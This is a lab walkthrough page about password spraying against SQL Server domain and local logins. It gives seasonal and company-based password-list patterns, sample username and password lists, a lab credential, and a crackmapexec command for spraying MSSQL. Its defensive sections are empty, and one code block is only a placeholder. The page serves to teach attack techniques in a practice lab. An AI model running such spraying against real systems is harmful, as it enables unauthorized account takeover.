# Weak passwords

## Configuring

### Prerequisite&#x20;

The weak passwords were configured during the creation of the SQL Server and domain users.

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Attacking

### How it works

SQL Servers can have two type of accounts that could connect to it. Domain user accounts or groups or SQL Server accounts. These accounts have access to the SQL server and might have higher privileges then we currently have. By spraying passwords against these user we might get access to them.

#### Password spraying

Password spraying is a type of brute force attack. An attacker will try a default password against a list of usernames. For example, an attacker uses the password `Welcome2022!` against many different accounts to avoid account lockout that would normally occur when brute-forcing a single account with many passwords.

A old habit what a lot of companies enforce is the requirement to change passwords every 30, 60 or 90 days. Which results in people changing their password often, forgetting it and eventually choosing a easy guessable password. Another habbit is adding a increment to the same password or using months/seasons. Which means we can easily create a password list of common passwords and things people would choose using following formats:

* season+year+! (Summer2022!)
* month+year+! (March2022!)
* companyname+year+! (Amsterdambank2022!)
* city+! (Amsterdam!)
* etc.

### Tools

* [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec)
* [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)

### Executing the attack

1. So during the enumeration we discovered that there are three domain users/groups which are `AMSTERDAM\richard`,  `BANK\administrator` and `AMSTERDAM\DatabaseUsers`.&#x20;
2. To check this, login to `WS01` as `Richard` with the password `Sample123`.
3. If we check these out we can see that `AMSTERDAM\DatabaseUsers` isn't a user but a group. With the help of powerview we can query the group members:

```
// Some code
```

2\. We already sprayed passwords at the SQL server during the initial access steps. We will do it again here. First we need to make a list of the enumerated logins in `users.txt`:

```
# domainusers.txt
AMSTERDAM\richard
BANK\administrator
AMSTERDAM\DatabaseUsers

# sqlusers.txt
Developer
Developer_test
testadmin
bob
SQLAdmin
```

2\. Secondly create a `passwords.txt` file and copy the following passwords like we did during the password spraying attack for normal domain users and we will also add the usernames since sometimes admin set the username as the password:

```
Spring2022!
Winter2022!
Autumn2022!
Summer2022!
Welcome2022!
Bank2022!
AmsterdamBank2022!
Fall2022!
testadmin
bob
SQLAdmin
Developer
Developer_test
```

3\. First we will run crackmapexec to connect to the MSSQL service and spray with local SQL users

```
crackmapexec mssql 10.0.0.5 -u users.txt -p passwords.txt --local-auth
```

## Defending

### Recommendations



### Detection



## References

